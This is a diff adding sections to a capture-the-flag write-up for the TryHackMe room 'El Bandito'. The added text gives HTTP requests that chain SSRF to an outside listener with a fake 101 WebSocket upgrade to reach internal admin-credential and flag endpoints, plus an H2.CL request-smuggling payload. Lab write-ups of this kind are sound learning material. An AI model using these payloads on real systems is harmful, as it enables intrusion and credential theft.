@@ -168,4 +168,114 @@ if __name__ == "__main__":
 python3 server.py 9000
 ```
 
-Trigger SSRF to your server (via the isOnline endpoint):
+**Trigger SSRF to your server (via the `isOnline` endpoint):**
+```http
+GET /isOnline?url=http://10.10.26.22:9000 HTTP/1.1
+Host: 10.10.169.87:8080
+```
+
+**Observation:** the proxy responded with:
+```bash
+101 Switching Protocols
+```
+After the successful 101 response, additional traffic to internal endpoints could be performed, for example:
+```http
+GET /trace HTTP/1.1
+Host: 10.10.169.87:8080
+```
+
+**Conclusion / notes:**
+- By returning a `101 Switching Protocols` response, the proxy may assume that a WebSocket upgrade has taken place, allowing it to forward or permit additional internal requests.
+- This is a powerful technique for gaining access to internal/forbidden endpoints that are normally not directly reachable from the outside.
+- Note: only use such techniques in authorized lab or CTF environments.
+
+---
+
+### 7. 🔓 Admin Credentials & Flag 1
+
+Through the SSRF response, admin credentials and the first flag were disclosed.
+
+**Obtained admin credentials (via SSRF):**
+```http
+GET /admin-creds HTTP/1.1
+Host: 10.10.169.87:8080
+```
+
+**Credentials obtained:**
+```makefile
+username: hAckLIEN
+password: [REDACTED]
+```
+
+**Then requested (flag endpoint):**
+```http
+GET /admin-flag HTTP/1.1
+Host: 10.10.169.87:8080
+```
+**Retrieved Flag:**
+```text
+THM{REDACTED}
+```
+
+**Login (web):**
+```arduino
+https://10.10.73.22/access
+```
+---
+
+### 8. 💥 Flag 2 — HTTP/2 Request Smuggling (H2.CL)
+
+During communication after logging in, traffic was observed being sent over **HTTP/2**:
+
+POST /send_message HTTP/2
+
+#### Testing for a possible downgrade (HTTP/2 → HTTP/1.1)
+- Add a **malformed `Content-Length`** header to an HTTP/2 request.  
+- In Burp Suite, disable the **"Update Content-Length"** option so that Burp does not correct the header.  
+- If the proxy downgrades the request to HTTP/1.1 and the backend processes the (incorrect) `Content-Length`, a **desynchronization (H2.CL)** can occur — causing the embedded extra data to be interpreted as a new request.
+
+**Technical observation:**  
+HTTP/2 normally ignores `Content-Length` headers; an error in response to such a header suggests that the frontend proxy downgraded the H2 request to H1 (where `Content-Length` **is** honored).
+
+**Why Varnish is relevant:**  
+Varnish does not natively handle HTTP/2 and relies on a frontend proxy that translates or downgrades HTTP/2 to HTTP/1.1. In such setups, desynchronization opportunities are more likely, enabling request smuggling.
+
+#### Example of a smuggle payload (conceptual / anonymized)
+```http
+POST /send_message HTTP/2
+Content-Length: 0
+
+POST /send_message HTTP/1.1
+Host: [REDACTED]
+Content-Length: 700
+data=
+```
+**Followed by:**
+```http
+GET /getMessages HTTP/2
+```
+
+**Result during testing:**  
+Refreshing `/getMessages` produced several `null entries` — indicating that the backend interpreted the payload structure differently and that the desynchronization succeeded.
+
+**Retrieved flag:**
+```text
+THM{Redacted}
+```
+
+---
+
+## Flags found
+
+| 🏷️ Flag   | Technique                         | Value        |
+| ---------- | --------------------------------- | ------------ |
+| Admin Flag | SSRF + WebSocket chaining         | `[REDACTED]` |
+| Chat Flag  | HTTP/2 → HTTP/1.1 H2.CL Smuggling | `[REDACTED]` |
+
+---
+
+## Room links
+
+📸 [screenshots](challenges/thm-el-bandito/screenshots.md)
+
+🔗 [TryHackMe - El bandito](https://tryhackme.com/room/elbandito)
